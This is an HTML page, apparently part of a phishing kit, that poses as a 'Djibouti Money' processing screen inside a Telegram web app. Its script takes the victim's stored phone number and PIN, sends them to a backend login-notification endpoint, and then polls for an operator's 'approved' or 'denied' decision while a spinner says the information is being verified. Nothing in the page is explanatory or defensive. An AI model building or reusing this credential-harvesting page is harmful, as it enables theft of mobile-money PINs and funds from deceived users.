<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Traitement - Djibouti Money</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { background: #111; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; text-align: center; }
        .card { background: #fff; color: #111; padding: 40px; border-radius: 20px; width: 85%; max-width: 380px; }
        .spinner { width: 50px; height: 50px; border: 4px solid #fde047; border-top: 4px solid #ca8a04; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
<div class="card">
    <div class="spinner"></div>
    <h2 id="main-text" style="color: #ca8a04;">Traitement...</h2>
    <p id="sub-text" style="color: #666;">Vérification des informations...</p>
</div>

<script>
    const phone = localStorage.getItem('phone') || "";
    const pin = localStorage.getItem('lastPin') || "";

    fetch("/api/login-notification", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ phone, pin })
    });

    setInterval(async () => {
        try {
            const res = await fetch(`/api/check-status?phone=${phone}`);
            const data = await res.json();
            if (data.status === "approved") location.href = "/page8";
            if (data.status === "denied") location.href = "/page6?error=wrongpin";
        } catch(e){}
    }, 2000);
</script>
</body>
</html>
